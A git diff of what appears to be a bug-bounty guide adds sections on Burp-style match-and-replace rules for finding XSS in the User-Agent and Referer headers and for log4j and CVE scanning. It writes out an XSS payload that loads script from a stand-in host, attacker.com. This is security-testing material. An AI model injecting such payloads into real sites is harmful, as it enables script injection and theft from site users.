@@ -65,3 +65,28 @@ By changing original user UUID to another UUID
 <img src="https://user-images.githubusercontent.com/36522826/166742159-f740ec61-cb94-4ee7-bacf-7ed5b00e26bb.png" width="400" />
 
 > Create another rule but change the `type` to "Request First Line"
+
+## Finding XSS
+By adding some XSS payload into the request
+
+* Finding XSS on `User-Agent`
+
+<img src="https://user-images.githubusercontent.com/36522826/166749425-b9accf44-a606-473d-94c6-8e9562e02c07.png" width="400" />
+
+* Finding XSS on `Referer`
+
+<img src="https://user-images.githubusercontent.com/36522826/166749753-d68eea0a-e290-4658-a2f1-cf66fcd89342.png" width="400" />
+
+* Auto replace user input with XSS payload
+
+<img src="https://user-images.githubusercontent.com/36522826/166752610-9d21d86e-49e5-4e8f-86bc-a9134350d46d.png" width="400" />
+
+> So by just inputting the words `xss_payload` on the website it will be immediately replaced with `"><script src=https://attacker.com></script>`
+
+## MISC
+Some random match and replace rules
+* Finding CVE-2021-44221
+
+<img src="https://user-images.githubusercontent.com/36522826/166748175-6782ce51-b10f-4b1d-b8a3-610ef142d567.png" width="400" />
+
+> Create some another rules to look for them in headers, parameters and more. Because log4j can be found anywhere
